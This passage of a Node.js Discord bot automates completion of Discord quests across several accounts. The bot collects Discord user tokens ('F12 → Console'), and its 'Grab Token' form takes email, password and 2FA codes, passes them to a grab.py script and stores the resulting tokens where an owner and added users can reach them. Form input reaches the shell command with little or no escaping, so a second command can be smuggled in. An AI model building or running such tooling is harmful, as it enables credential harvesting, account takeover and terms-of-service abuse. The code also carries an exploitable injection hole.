        await rest.put(Routes.applicationCommands(clientId), { body: commands });
        tLog('cmd', T.success + 'Slash commands registered successfully!' + T.reset);
        tLog('cmd', T.dim + 'Commands: /autoquest, /invite' + T.reset);
    } catch (e) {
        tLog('err', T.error + 'Failed to register commands: ' + e.message + T.reset);
        // Don't exit — commands may already exist or rate limit
    }
}

// ═══════════════════════════════════════════════════════════════
// BOT CORE
// ═══════════════════════════════════════════════════════════════
async function startBot(botToken) {
    BOT_TOKEN = botToken;

    const client = new Client({
        intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages, GatewayIntentBits.MessageContent]
    });
    BOT_CLIENT = client;

    // ── Silent error handler ────────────────────────────
    client.on('error', (err) => {
        if (err?.code === 10062 || err?.code === 40060) return;
        console.error('[CLIENT ERROR]', err?.code || err?.message?.slice(0,80));
    });

    // ── Self-register commands on ready ─────────────────
    client.once('clientReady', async (readyClient) => {
        tLog('bot', T.success + T.bold + readyClient.user.tag + T.reset + ' is online ' + T.success + '✓' + T.reset);

        // Self-register slash commands
        await registerCommands(botToken, readyClient.user.id);

        tDiv('─');
        tLog('sys', T.primary + T.bold + 'Bot is READY' + T.reset + ' — Waiting for interactions...');
        console.log('');
    });

    client.on('interactionCreate', async (int) => {
        // ── Helpers ───────────────────────────────────────────
        async function safeDefer() {
            try {
                if (int.replied || int.deferred) return true;
                await (int.isChatInputCommand() || int.isModalSubmit() ? int.deferReply() : int.deferUpdate());
                return true;
            } catch (e) {
                if (e.code === 10062 || e.code === 40060) return false;
                throw e;
            }
        }

        async function quickShow(label, buildFn) {
            if (!await safeDefer()) return;
            try {
                const lc = mkContainer(CLR.B);
                lc.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                    `## <a:HB7f:1498939702915502112> ${label}...\n-# ${SC('please wait...')}`
                ));
                await int.editReply(wrap(lc));
            } catch {}
            if (typeof buildFn !== 'function') return true;
            try {
                return await int.editReply(await buildFn());
            } catch (e) {
                const errC = mkContainer(CLR.R);
                errC.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                    `# ❌ ${SC('failed to load')}\n-# \`${e.message?.slice(0, 100) || 'unknown'}\``
                ));
                addSep(errC);
                errC.addActionRowComponents(new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('q_back')        .setLabel('Back to Menu').setStyle(ButtonStyle.Primary)  .setEmoji({ id: '1493406616937169039', name: 'arrow_left' }),
                    new ButtonBuilder().setCustomId('q_refresh_main').setLabel('Retry')       .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498991627140862032', name: 'radar', animated: true })
                ));
                return await int.editReply(wrap(errC));
            }
        }

        try {
            const data     = dbLoad();
            const uid      = int.user.id;
            const ac       = acLoad();
            const ownerId  = ac.ownerId || uid;
            const tokens   = getTokens(ownerId);

            // ── /autoquest command ────────────────────────────
            if (int.isChatInputCommand() && int.commandName === 'autoquest') {
                const access = acAllowed(uid);
                if (access === 'NO_OWNER') { acSetOwner(uid); return quickShow(SC('launching'), () => uiMain(data, uid)); }
                if (!access) return denyAccess(int, uid);
                return quickShow(SC('launching'), () => uiMain(data, uid));
            }

            // ── /invite command ───────────────────────────────
            if (int.isChatInputCommand() && int.commandName === 'invite') {
                const access = acAllowed(uid);
                if (!access) return denyAccess(int, uid);

                const cid = decodeBotClientId(BOT_TOKEN);
                if (!await safeDefer()) return;

                if (!cid) {
                    return int.editReply(uiInfo(CLR.R, `# ❌ ${SC('client id not available')}`, false));
                }

                const inviteUrl = `https://discord.com/oauth2/authorize?client_id=${cid}&integration_type=1&scope=applications.commands`;
                const c = mkContainer(CLR.B);
                c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                    `# 🔗 ${SC('invite link')}\n` +
                    `-# ${SC('share this link so others can install the bot')}\n\n` +
                    `[Invite link](${inviteUrl})\n\n` +
                    `-# ${SC('open in browser → authorize → /autoquest will work')}`
                ));
                return int.editReply({ components: [c], flags: F_V2 });
            }

            // ── Block denied users ────────────────────────────
            if (!int.isChatInputCommand()) {
                const access = acAllowed(uid);
                if (access !== 'NO_OWNER' && !access) return denyAccess(int, uid);
            }

            // ── Back ──────────────────────────────────────────
            if (int.isButton() && int.customId === 'q_back')
                return quickShow(SC('loading menu'), () => uiMain(dbLoad(), uid));

            // ── Refresh main ──────────────────────────────────
            if (int.isButton() && int.customId === 'q_refresh_main') {
                return quickShow(SC('refreshing'), async () => {
                    const d2  = dbLoad(); const ac2 = d2.access || {};
                    const own = ac2.ownerId || uid;
                    for (const t of getTokens(own)) { cache.info.delete(t); cache.quest.delete(t); }
                    return await uiMain(d2, uid);
                });
            }

            // ── Refresh quests ────────────────────────────────
            if (int.isButton() && int.customId.startsWith('q_refresh_')) {
                if (!await safeDefer()) return;
                const ai = parseInt(int.customId.split('_')[2]);
                if (ai === -1) return int.editReply(await uiMain(dbLoad(), uid));
                const t = tokens[ai]; if (!t) return int.editReply(uiInfo(CLR.R, '❌ Invalid.'));
                cache.info.delete(t); cache.quest.delete(t);
                const inf = await cachedInfo(t);
                const qs  = await fetchQuests(t);
                if (qs) vaultSync(qs);
                return int.editReply(uiQuestStatus([await buildQuestRow(t, inf, qs, ai)], ai));
            }

            // ── Stop ──────────────────────────────────────────
            if (int.isButton() && int.customId === 'q_stop') {
                try { await int.deferUpdate(); } catch {}
                runtime.stopFlags.set(uid, true);
                const run = runtime.activeRuns.get(uid);
                if (run) {
                    const dc = run.states.filter(s => s.done).length;
                    const sc = mkContainer(CLR.D);
                    sc.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                        `# <:Cross:1498992013499039855> ${SC('stopping...')}\n${run.buildLines()}\n### <a:tickk:1512955302629216468> ${dc}/${run.total} ${SC('done')}\n-# ${SC('please wait...')}`
                    ));
                    addSep(sc);
                    try { await int.editReply(wrap(sc)); } catch {}
                }
                return;
            }

            // ── Progress refresh once ─────────────────────────
            if (int.isButton() && int.customId === 'q_progress_refresh_once') {
                try { await int.deferUpdate(); } catch (e) { if (e.code === 10062) return; }
                const run = runtime.activeRuns.get(uid);
                if (!run || run.sessionId !== runtime.sessions.get(uid)) return;
                const dc = run.states.filter(s => s.done).length;
                try { await int.editReply(uiProgress(run.buildLines(), dc, run.total)); } catch {}
                return;
            }

            // ── Progress auto refresh ─────────────────────────
            if (int.isButton() && int.customId === 'q_progress_autorefresh') {
                const arSess = runtime.sessions.get(uid);
                try { await int.deferUpdate(); } catch (e) { if (e.code === 10062) return; }
                const runNow = runtime.activeRuns.get(uid);
                if (!runNow || runNow.sessionId !== arSess) return;
                const dcNow = runNow.states.filter(s => s.done).length;
                try { await int.editReply(uiProgress(runNow.buildLines(), dcNow, runNow.total, true)); } catch {}
                while (true) {
                    await delay(4000);
                    if (runtime.sessions.get(uid) !== arSess) break;
                    const run2 = runtime.activeRuns.get(uid);
                    if (!run2 || run2.sessionId !== arSess) break;
                    const dc2      = run2.states.filter(s => s.done).length;
                    const finished = run2.states.every(s => s.done);
                    try { await int.editReply(uiProgress(run2.buildLines(), dc2, run2.total, !finished)); if (finished) break; } catch { break; }
                }
                return;
            }

            // ── Add account modal ─────────────────────────────
            if (int.isButton() && int.customId === 'q_add') {
                const modal = new ModalBuilder().setCustomId('modal_add').setTitle('Add Discord Account');
                modal.addComponents(new ActionRowBuilder().addComponents(
                    new TextInputBuilder().setCustomId('tk').setLabel('Paste your Discord user token')
                        .setStyle(TextInputStyle.Paragraph).setPlaceholder('Paste your token here (F12 → Console)')
                        .setMinLength(50).setMaxLength(4000).setRequired(true)
                ));
                try { return await int.showModal(modal); }
                catch { if (!await safeDefer()) return; return int.editReply(uiInfo(CLR.R, `❌ ${SC('modal failed. please try again.')}`)); }
            }

            // ── Grab token modal ──────────────────────────────
            if (int.isButton() && int.customId === 'q_grabtok') {
                const modal = new ModalBuilder().setCustomId('modal_grab_emailpass').setTitle('Grab Token');
                modal.addComponents(
                    new ActionRowBuilder().addComponents(
                        new TextInputBuilder().setCustomId('grab_email').setLabel('Discord Email')
                            .setStyle(TextInputStyle.Short).setPlaceholder('discord@email.com').setMinLength(5).setMaxLength(200).setRequired(true)
                    ),
                    new ActionRowBuilder().addComponents(
                        new TextInputBuilder().setCustomId('grab_pass').setLabel('Discord Password')
                            .setStyle(TextInputStyle.Short).setPlaceholder('************').setMinLength(3).setMaxLength(200).setRequired(true)
                    )
                );
                try { return await int.showModal(modal); }
                catch { if (!await safeDefer()) return; return int.editReply(uiInfo(CLR.R, `❌ ${SC('modal failed. please try again.')}`)); }
            }

            // ── View quests ───────────────────────────────────
            if (int.isButton() && int.customId === 'q_quests') {
                if (!tokens.length) {
                    try { await int.deferUpdate(); } catch (e) { if (e.code === 10062) return; throw e; }
                    return int.editReply(uiInfo(CLR.R, `❌ ${SC('no accounts! add one in manage.')}`, false));
                }
                if (!await quickShow(SC('loading quests'))) return;
                if (tokens.length === 1) {
                    const inf = await cachedInfo(tokens[0]);
                    const qs  = await fetchQuests(tokens[0]);
                    if (qs) vaultSync(qs);
                    return int.editReply(uiQuestStatus([await buildQuestRow(tokens[0], inf, qs, 0)], 0));
                }
                const infos = await Promise.all(tokens.slice(0, 25).map(t => cachedInfo(t)));
                const opts  = infos.map((inf, i) => ({ label: inf.name, value: `vq_${i}`, description: `View quests for ${inf.name}` }));
                const cv    = mkContainer(CLR.T);
                cv.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ${ORBS_E} ${SC('view quests')}\n-# ${SC('select account to view')}`));
                addSep(cv);
                cv.addActionRowComponents(new ActionRowBuilder().addComponents(
                    new StringSelectMenuBuilder().setCustomId('sel_vq_account').setPlaceholder(`${SC('select account')}...`).addOptions(opts)
                ));
                cv.addActionRowComponents(new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('q_back').setLabel('Back').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
                ));
                return int.editReply(wrap(cv));
            }

            if (int.isStringSelectMenu() && int.customId === 'sel_vq_account') {
                return quickShow(SC('loading quests'), async () => {
                    const ai  = parseInt(int.values[0].split('_')[1]);
                    const t   = tokens[ai]; if (!t) return uiInfo(CLR.R, '❌ Invalid.');
                    const inf = await cachedInfo(t);
                    const qs  = await fetchQuests(t);
                    if (qs) vaultSync(qs);
                    return uiQuestStatus([await buildQuestRow(t, inf, qs, ai)], ai);
                });
            }

            // ── Complete button ───────────────────────────────
            if (int.isButton() && int.customId === 'q_complete') {
                if (!tokens.length) {
                    try { await int.deferUpdate(); } catch (e) { if (e.code === 10062) return; throw e; }
                    return int.editReply(uiInfo(CLR.R, `❌ ${SC('no accounts! add one in manage.')}`, false));
                }
                if (!await quickShow(SC('loading quests'))) return;
                if (runtime.activeRuns.has(uid)) {
                    const run = runtime.activeRuns.get(uid);
                    if (run.sessionId === runtime.sessions.get(uid)) {
                        const dc = run.states.filter(s => s.done).length;
                        return int.editReply(uiProgress(run.buildLines(), dc, run.total));
                    }
                }
                const ai   = getActiveIdx(ownerId);
                const t    = tokens[ai] || tokens[0];
                const inf  = await cachedInfo(t);
                const qs   = await fetchQuests(t);
                if (!qs) return int.editReply(uiInfo(CLR.R, `❌ ${SC('could not fetch quests.')}`));
                const playable = qs.filter(q => {
                    if (!questIsPlay(q) || questExpired(q) || q.user_status?.claimed_at) return false;
                    const { type, target } = questTarget(q);
                    if (target > 0) { const cur = (q.user_status?.progress || {})[type]?.value || 0; if (cur >= target) return false; }
                    return true;
                });
                const questOpts = buildQuestOpts(playable, inf.name, ai);
                if (!questOpts.length) return int.editReply(uiInfo(CLR.G, `# ✅ ${SC('no pending quests!')}\n> ${SC('all quests are already completed or claimed.')}`));
                return int.editReply(uiQuestSelector(questOpts, `<@${inf.id}>`, ai));
            }

            if (int.isStringSelectMenu() && int.customId === 'sel_account') {
                return quickShow(SC('loading quests'), async () => {
                    const ai  = parseInt(int.values[0].split('_')[1]);
                    const t   = tokens[ai]; if (!t) return uiInfo(CLR.R, '❌ Invalid.');
                    const inf = await cachedInfo(t);
                    const qs  = await fetchQuests(t);
                    if (!qs) return uiInfo(CLR.R, `❌ ${SC('failed to fetch quests.')}`);
                    const playable = qs.filter(q => {
                        if (!questIsPlay(q) || questExpired(q) || q.user_status?.claimed_at) return false;
                        const { type, target } = questTarget(q);
                        if (target > 0) { const cur = (q.user_status?.progress || {})[type]?.value || 0; if (cur >= target) return false; }
                        return true;
                    });
                    const qOpts = buildQuestOpts(playable, inf.name, ai);
                    if (!qOpts.length) return uiInfo(CLR.G, `# ✅ ${SC('no pending quests!')}\n> ${SC('all quests are already completed or claimed.')}`);
                    return uiQuestSelector(qOpts, `<@${inf.id}>`, ai);
                });
            }

            if (int.isStringSelectMenu() && int.customId === 'sel_complete') {
                if (!await safeDefer()) return;
                return runQuests(int, uid, tokens, int.values[0]);
            }

            // ── Complete all ──────────────────────────────────
            if (int.isButton() && int.customId.startsWith('q_completeall_')) {
                if (!tokens.length) {
                    if (!await safeDefer()) return;
                    return int.editReply(uiInfo(CLR.R, `❌ ${SC('no accounts! add one in manage.')}`));
                }
                if (!await safeDefer()) return;
                const suffix = int.customId.split('_')[2];
                if (suffix === 'all') return runQuests(int, uid, tokens, 'all_all');
                return runQuests(int, uid, tokens, `all_acc_${suffix}`);
            }

            // ── Switch account ────────────────────────────────
            if (int.isButton() && int.customId === 'q_switch') {
                return quickShow(SC('loading accounts'), async () => await uiSwitch(tokens));
            }

            if (int.isStringSelectMenu() && int.customId === 'sel_switch') {
                return quickShow(SC('switching'), async () => {
                    const v = int.values[0];
                    if (v === 'all') { setActiveIdx(ownerId, null); }
                    else { const idx = parseInt(v); if (!isNaN(idx) && idx < tokens.length) setActiveIdx(ownerId, idx); }
                    return await uiMain(dbLoad(), uid);
                });
            }

            // ── Manage accounts ───────────────────────────────
            if (int.isButton() && int.customId === 'q_accounts') {
                return quickShow(SC('loading accounts'), async () => {
                    const lvl = acLevel(uid);
                    if (lvl === 'half') return uiInfo(CLR.R, `# <a:HB6l:1513308976278798357> ${SC('half access only')}\n> ${SC('you can only view quests & complete them.')}\n> ${SC('ask the owner for full access.')}`);
                    return await uiManage(tokens, getActiveIdx(ownerId), ac.ownerId === String(uid), lvl === 'full');
                });
            }

            if (int.isStringSelectMenu() && int.customId === 'sel_remove') {
                return quickShow(SC('removing'), async () => {
                    if (ac.ownerId !== String(uid)) return uiInfo(CLR.R, `❌ ${SC('only owner can remove accounts.')}`);
                    const idx = parseInt(int.values[0]);
                    if (isNaN(idx) || idx >= tokens.length) return uiInfo(CLR.R, '❌ Invalid.');
                    removeToken(ownerId, idx);
                    const newTokens = getTokens(ownerId);
                    const lvlAfter = acLevel(uid);
                    const newAc = acLoad();
                    return await uiManage(newTokens, getActiveIdx(ownerId), newAc.ownerId === String(uid), lvlAfter === 'full');
                });
            }

            // ── Access control ────────────────────────────────
            if (int.isButton() && int.customId === 'q_access')
                return quickShow(SC('loading'), () => uiAccessPanel(uid));

            if (int.isButton() && int.customId === 'q_access_ref')
                return quickShow(SC('refreshing'), () => uiAccessPanel(uid));

            if (int.isButton() && int.customId === 'q_access_add_user') {
                const lvl = acLevel(uid);
                if (lvl !== 'owner' && lvl !== 'full') {
                    if (!await safeDefer()) return;
                    return int.editReply(uiInfo(CLR.R, `❌ ${SC('only owner or full access can add users.')}`));
                }
                const modal = new ModalBuilder().setCustomId('modal_access_add_user').setTitle('👤 Add User');
                modal.addComponents(new ActionRowBuilder().addComponents(
                    new TextInputBuilder().setCustomId('access_uid').setLabel('User ID or Username')
                        .setPlaceholder('Enter User ID (numbers) or username')
                        .setStyle(TextInputStyle.Short).setMinLength(2).setMaxLength(50).setRequired(true)
                ));
                try { return await int.showModal(modal); }
                catch { if (!await safeDefer()) return; return int.editReply(uiInfo(CLR.R, `❌ ${SC('modal failed. please try again.')}`)); }
            }

            if (int.isButton() && int.customId === 'q_access_manage') {
                if (!await safeDefer()) return;
                const lvl = acLevel(uid);
                if (lvl !== 'owner' && lvl !== 'full') return int.editReply(uiInfo(CLR.R, `❌ ${SC('no permission.')}`));
                const panel = await uiAccessManage(uid);
                if (!panel) return int.editReply(uiInfo(CLR.Y, `⚠️ ${SC('no users to manage yet.')}`));
                return int.editReply(panel);
            }

            if (int.isStringSelectMenu() && int.customId === 'sel_access_pick_user') {
                if (!await safeDefer()) return;
                const lvl = acLevel(uid);
                if (lvl !== 'owner' && lvl !== 'full') return int.editReply(uiInfo(CLR.R, `❌ ${SC('no permission.')}`));
                return int.editReply(uiAccessUser(int.values[0]));
            }

            if (int.isButton() && int.customId.startsWith('q_mau_full_')) {
                if (!await safeDefer()) return;
                const lvl = acLevel(uid); if (lvl !== 'owner' && lvl !== 'full') return int.editReply(uiInfo(CLR.R, `❌ ${SC('no permission.')}`));
                const targetId = int.customId.replace('q_mau_full_', '');
                acAddFull(targetId);
                return int.editReply(uiAccessUser(targetId));
            }

            if (int.isButton() && int.customId.startsWith('q_mau_half_')) {
                if (!await safeDefer()) return;
                const lvl = acLevel(uid); if (lvl !== 'owner' && lvl !== 'full') return int.editReply(uiInfo(CLR.R, `❌ ${SC('no permission.')}`));
                const targetId = int.customId.replace('q_mau_half_', '');
                acAddHalf(targetId);
                return int.editReply(uiAccessUser(targetId));
            }

            if (int.isButton() && int.customId.startsWith('q_mau_remove_')) {
                if (!await safeDefer()) return;
                const lvl = acLevel(uid); if (lvl !== 'owner' && lvl !== 'full') return int.editReply(uiInfo(CLR.R, `❌ ${SC('no permission.')}`));
                const targetId = int.customId.replace('q_mau_remove_', '');
                if (targetId === ac.ownerId) return int.editReply(uiInfo(CLR.R, `❌ ${SC('cannot remove the owner.')}`));
                acRemove(targetId);
                const panel = await uiAccessManage(uid);
                if (!panel) return int.editReply(uiAccessPanel(uid));
                return int.editReply(panel);
            }

            // ── Modal: Add account (token) ────────────────────
            if (int.isModalSubmit() && int.customId === 'modal_add') {
                const tk       = int.fields.getTextInputValue('tk').trim();
                const ownerId2 = ac.ownerId || uid;
                if (!await safeDefer()) return;
                if (tk.length < 50) return int.editReply(uiInfo(CLR.R, `❌ ${SC('token too short.')}`));
                const me = await fetchMe(tk);
                if (!me) return int.editReply(uiInfo(CLR.R, `❌ ${SC('invalid token!')}`));
                const d = dbLoad();
                if (!d.tokens) d.tokens = [];
                if (d.tokens.some(t => t.token === tk)) return int.editReply(uiInfo(CLR.Y, `⚠️ ${SC('already saved!')}`));
                d.tokens.push({
                    id: me.id, token: tk, name: me.username,
                    addedAt: new Date().toISOString(),
                    isActive: d.tokens.length === 0,
                    isVerified: true,
                    verifiedInfo: { valid: true, username: `${me.username}#${me.discriminator || '0'}`, userId: me.id, avatar: me.avatar || '', email: me.email || '', mfaEnabled: me.mfa_enabled || false }
                });
                dbSave(d);
                const c2 = mkContainer(CLR.G);
                c2.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                    `# ✅ ${SC('account added!')}\n> **${me.username}**  \`${me.id}\`\n📊 **${d.tokens.length}** ${SC('account(s) total')}`
                ));
                addSep(c2);
                return int.editReply({ components: [c2], flags: F_V2 });
            }

            // ── Modal: Grab token (email+pass) ────────────────
            if (int.isModalSubmit() && int.customId === 'modal_grab_emailpass') {
                const email     = int.fields.getTextInputValue('grab_email').trim();
                const pass      = int.fields.getTextInputValue('grab_pass').trim();
                const ownerId2  = ac.ownerId || uid;
                if (!await safeDefer()) return;
                if (!email.includes('@')) return int.editReply(uiInfo(CLR.R, `❌ ${SC('invalid email.')}`));
                if (pass.length < 3)     return int.editReply(uiInfo(CLR.R, `❌ ${SC('password too short.')}`));

                await int.editReply(uiInfo(CLR.Y, `# <a:HB7f:1498939702915502112> ${SC('grabbing token...')}\n> <:giveaways:1459851717368873118> \`${email}\`\n-# ${SC('please wait...')}`));
                const result = runGrabPy(`--email "${email.replace(/"/g, '\\"')}" --password "${pass.replace(/"/g, '\\"')}"`);

                if (result.status === 'success' && result.token) {
                    const saved = await saveToken(result.token, ownerId2);
                    if (saved.ok) {
                        const c2 = mkContainer(CLR.G);
                        c2.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                            `# <a:tickk:1512955302629216468> ${SC('token grabbed!')}\n` +
                            `-# <:owo_yay:1498978297210605608> ${SC('account saved successfully')}\n\n` +
                            `> <:dev:1459861201239539752> **ᴜꜱᴇʀ :** <@${saved.id}> (\`${saved.name}\`)\n` +
                            `> <:giveaways:1459851717368873118> **ᴇᴍᴀɪʟ :** \`${email}\`\n` +
                            `> <a:HB7f:1498939702915502112> **ᴛᴏᴋᴇɴ :** ||\`${result.token.slice(0, 25)}...\`||\n` +
                            `> <:users:1495715447130296361> **ᴛᴏᴛᴀʟ ᴀᴄᴄᴏᴜɴᴛꜱ :** \`${saved.count}\``
                        ));
                        addSep(c2);
                        c2.addActionRowComponents(new ActionRowBuilder().addComponents(
                            new ButtonBuilder().setCustomId('q_accounts').setLabel('Manage Accounts').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1495715447130296361', name: 'users' }),
                            new ButtonBuilder().setCustomId('q_back')    .setLabel('Back')           .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
                        ));
                        return int.editReply({ components: [c2], flags: F_V2 });
                    }
                    if (saved.dup) return int.editReply(uiInfo(CLR.Y, saved.msg));
                    return int.editReply(uiInfo(CLR.R, saved.msg));
                }

                if (result.status === 'mfa' && result.ticket) {
                    runtime.pendingMFA.set(uid, { email, ticket: result.ticket });
                    const m = new ModalBuilder().setCustomId('modal_grab_2fa').setTitle('🔐 Enter 2FA Code');
                    m.addComponents(new ActionRowBuilder().addComponents(
                        new TextInputBuilder().setCustomId('grab_2fa_code').setLabel('6-digit 2FA code from your authenticator')
                            .setStyle(TextInputStyle.Short).setPlaceholder('123456').setMinLength(6).setMaxLength(8).setRequired(true)
                    ));
                    return int.showModal(m);
                }
                if (result.status === 'captcha') return int.editReply(uiInfo(CLR.O, `# 🛡️ ${SC('captcha!')}\n> ${SC('discord wants captcha. use a token instead.')}`));
                if (result.status === 'verify')  return int.editReply(uiInfo(CLR.O, `# 📧 ${SC('verify!')}\n> ${SC('check email inbox, verify the login, then try again.')}`));
                if (result.status === 'bad_creds') return int.editReply(uiInfo(CLR.R, `# ❌ ${SC('wrong creds!')}\n> ${SC('check email and password.')}`));
                return int.editReply(uiInfo(CLR.R, `❌ ${SC('grab.py error:')} ${result.error || 'unknown'}`));
            }

            // ── Modal: 2FA code ───────────────────────────────
            if (int.isModalSubmit() && int.customId === 'modal_grab_2fa') {
                const code      = int.fields.getTextInputValue('grab_2fa_code').trim();
                const pending   = runtime.pendingMFA.get(uid);
                const ownerId2  = ac.ownerId || uid;
                if (!await safeDefer()) return;
                if (!pending) return int.editReply(uiInfo(CLR.R, `❌ ${SC('session expired. try grab again.')}`));

                await int.editReply(uiInfo(CLR.Y, `# <a:HB7f:1498939702915502112> ${SC('submitting 2fa...')}\n-# ${SC('please wait...')}`));
                const result = runGrabPy(`--ticket "${pending.ticket}" --code "${code}"`);
                runtime.pendingMFA.delete(uid);

                if (result.status === 'success' && result.token) {
                    const saved = await saveToken(result.token, ownerId2);
                    if (saved.ok) {
                        const c2 = mkContainer(CLR.G);
                        c2.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                            `# <a:tickk:1512955302629216468> ${SC('2fa passed! token grabbed!')}\n` +
                            `-# <:owo_yay:1498978297210605608> ${SC('account saved successfully')}\n\n` +
                            `> <:dev:1459861201239539752> **ᴜꜱᴇʀ :** <@${saved.id}> (\`${saved.name}\`)\n` +
                            `> <:giveaways:1459851717368873118> **ᴇᴍᴀɪʟ :** \`${pending.email}\`\n` +
                            `> <a:HB7f:1498939702915502112> **ᴛᴏᴋᴇɴ :** ||\`${result.token.slice(0, 25)}...\`||\n` +
                            `> <:users:1495715447130296361> **ᴛᴏᴛᴀʟ ᴀᴄᴄᴏᴜɴᴛꜱ :** \`${saved.count}\``
                        ));
                        addSep(c2);
                        c2.addActionRowComponents(new ActionRowBuilder().addComponents(
                            new ButtonBuilder().setCustomId('q_accounts').setLabel('Manage Accounts').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1495715447130296361', name: 'users' }),
                            new ButtonBuilder().setCustomId('q_back')    .setLabel('Back')           .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
                        ));
                        return int.editReply({ components: [c2], flags: F_V2 });
                    }
                    if (saved.dup) return int.editReply(uiInfo(CLR.Y, saved.msg));
                    return int.editReply(uiInfo(CLR.R, saved.msg));
                }
                return int.editReply(uiInfo(CLR.R, `❌ ${SC('2fa failed:')} ${result.error || 'invalid code'}`));
            }

            // ── Modal: Add access user ────────────────────────
            if (int.isModalSubmit() && int.customId === 'modal_access_add_user') {
                const freshAc = acLoad();
                if (!await safeDefer()) return;
                const lvl = acLevel(uid);
                if (lvl !== 'owner' && lvl !== 'full') return int.editReply(uiInfo(CLR.R, `❌ ${SC('only owner or full access can add users.')}`));
                const rawInput = int.fields.getTextInputValue('access_uid').trim();

                let targetId     = null;
                let resolvedName = null;

                if (/^\d{17,20}$/.test(rawInput)) {
                    targetId = rawInput;
                    try {
                        const res = await fetch(`https://discord.com/api/v9/users/${targetId}`, {
                            headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' }
                        });
                        if (res.ok) { const d = await res.json(); resolvedName = d.global_name || d.username || null; }
                    } catch {}
                } else {
                    const d2        = dbLoad();
                    const ownerId2  = freshAc.ownerId || uid;
                    const allToks   = getTokens(ownerId2);
                    const lowerIn   = rawInput.toLowerCase();
                    for (const t of allToks) {
                        try {
                            const me = await fetchMe(t);
                            if (me && (me.username?.toLowerCase() === lowerIn || me.global_name?.toLowerCase() === lowerIn)) {
                                targetId = me.id; resolvedName = me.global_name || me.username; break;
                            }
                        } catch {}
                    }
                    if (!targetId && allToks.length) {
                        try {
                            const r = await discordAPI(allToks[0], 'GET', '/users/@me/relationships');
                            if (r.s === 200 && Array.isArray(r.d)) {
                                const found = r.d.find(rel =>
                                    rel.user?.username?.toLowerCase() === lowerIn ||
                                    rel.user?.global_name?.toLowerCase() === lowerIn
                                );
                                if (found) { targetId = found.user.id; resolvedName = found.user.global_name || found.user.username; }
                            }
                        } catch {}
                    }
                    if (!targetId) return int.editReply(uiInfo(CLR.R, `# ❌ ${SC('user not found')}\n> ${SC('enter a valid user id or username from your accounts / friends list.')}`));
                }

                if (targetId === freshAc.ownerId) return int.editReply(uiInfo(CLR.Y, `⚠️ ${SC('that is the owner already!')}`));
                const existingLvl = acLevel(targetId);
                if (existingLvl === 'half' || existingLvl === 'full') return int.editReply(uiInfo(CLR.Y, `⚠️ ${SC('user already has access!')}`));

                acAddHalf(targetId);
                const nameStr = resolvedName ? ` (**${resolvedName}**)` : '';
                const c2 = mkContainer(CLR.G);
                c2.addTextDisplayComponents(new TextDisplayBuilder().setContent(
                    `# <:User:1483558170935820420> ${SC('user added!')}\n> <@${targetId}>${nameStr} \`${targetId}\`\n> <a:HB6l:1513308976278798357> ${SC('half access — can view quests & complete only.')}\n-# ${SC('use manage access to give full access.')}`
                ));
                addSep(c2);
                c2.addActionRowComponents(new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('q_access').setLabel('Back to Access').setStyle(ButtonStyle.Secondary).setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
                ));
                return int.editReply({ components: [c2], flags: F_V2 });
            }

        } catch (e) {
            if (e.code === 10062 || e.code === 40060) return;
            tLog('err', `${e.message?.slice(0, 120)} | ping: ${getPing()}ms`);
            const errC = mkContainer(CLR.R);
            let errTxt = `# ❌ ${SC('something went wrong')}\n-# \`${e.message?.slice(0, 100) || 'unknown error'}\``;
            errTxt += `\n-# <:duration:1498990306383626403> ${SC('uptime:')} <t:${getUptimeTs()}:R>`;
            errC.addTextDisplayComponents(new TextDisplayBuilder().setContent(errTxt));
            addSep(errC);
            errC.addActionRowComponents(new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('q_back')        .setLabel('Back to Menu').setStyle(ButtonStyle.Primary)  .setEmoji({ id: '1493406616937169039', name: 'arrow_left' }),
                new ButtonBuilder().setCustomId('q_refresh_main').setLabel('Retry')       .setStyle(ButtonStyle.Secondary).setEmoji({ id: '1498991627140862032', name: 'radar', animated: true })
            ));
            try {
                if (!int.replied && !int.deferred) await int.reply({ components: [errC], flags: F_V2 });
                else await int.editReply({ components: [errC], flags: F_V2 });
            } catch {}
        }
    });

    await client.login(botToken).catch(e => { console.error('[BOT] Login:', e.message); process.exit(1); });
}

// ═══════════════════════════════════════════════════════════════
// STARTUP
// ═══════════════════════════════════════════════════════════════
async function startup() {
    console.clear();
    console.log('\n');
    console.log(termBox([
        T.bold + T.primary + '  AUTO QUEST  ' + T.reset,
        T.dim  + '  Discord Quest Auto-Completer  ' + T.reset,
    ], T.primary));
    console.log('');
    tDiv();
    console.log('');

    // ── First-time: npm install if needed ──────────
    let depsOK = false;
    try { require.resolve('discord.js'); depsOK = true; } catch {}
    if (!depsOK) {
        tLog('sys', T.warning + 'First run detected — installing dependencies...' + T.reset);
        tLog('info', 'Running: npm install discord.js');
        try {
            execSync('npm install discord.js@latest', { cwd: __dirname, stdio: 'inherit', timeout: 120000 });
            tLog('ok', T.success + 'Dependencies installed!' + T.reset);
        } catch (e) {
            tLog('err', T.error + 'npm install failed: ' + e.message.slice(0, 80) + T.reset);
            tLog('info', 'Try manually: cd ' + __dirname + ' && npm install discord.js');
            process.exit(1);
        }
        console.log('');
        tDiv();
        console.log('');
    }

    // ── Load config.json ─────────────────────────
    tLog('sys', T.success + 'config.json loaded.' + T.reset);

    const d  = dbLoad();
    const ac = acLoad();

    // ── Owner setup ──────────────────────────────
    if (!ac.ownerId) {
